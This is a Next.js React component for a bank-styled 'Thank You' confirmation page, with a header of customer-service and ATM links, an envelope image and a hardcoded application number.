"use client"
import axios from "axios";
import Image from "next/image";
import { Heroicon } from '../../components/icons'; // Importing icons
// import {HandBurger} from "../components/icons"
import { useEffect, useState } from "react";
import Link from "next/link";
import { ClockIcon } from "@heroicons/react/16/solid";
import { LockClosedIcon } from "@heroicons/react/24/outline";


const ThankYou = () => {
    return (
      <main style={{

        // backgroundImage: "url('/assets/bg.jpg')",
        backgroundAttachment: 'fixed',
        backgroundSize: 'cover',
        backgroundRepeat: 'no-repeat',
        backgroundPosition: 'center center',
        height: '100%', // Example height, adjust as needed
                width: '100%', // Example width, adjust as needed
        zIndex:9999}}>
          
          <div className='flex justify-between items-center text-white py-2 px-[20%] bg-black'>
        {/* <div className="flex flex-col font-bold text-[25px]"> */}
        <img src="assets/data.jpg"/>
          {/* </div> */}
          <div className='space-x-4 space-y-10 text-xs'>
            <Link href="/" legacyBehavior><a className="hover:text-gray-500"> <LockClosedIcon className=" m-h-5 w-5 mr-2" /> {/* Heroicon Icon */}
            Customer Service</a></Link>
            <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Atms/Locations</a></Link>
            <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Español</a></Link>
          </div>
  </div>
  <div className="flex justify-center items-center">
  <span className="text-6xl font-bold mt-20">Thank You</span>
</div>
<div className="container w-full sm:w-[80%] md:w-[80%] lg:w-[50%] mx-auto mt-22 px-4 filter contrast-100">
<div className="flex flex-col items-center justify-center space-y-4 p-6 rounded-md shadow-xl">
  <img src="assets/envelope.jpeg" className="w-64 h-auto"/>
  <span>Your submission has been received.</span>
  <span>Your Application Number is </span><span className="font-bold">00230694</span>
  </div>
</div>
      </main>
  )
}

export default ThankYou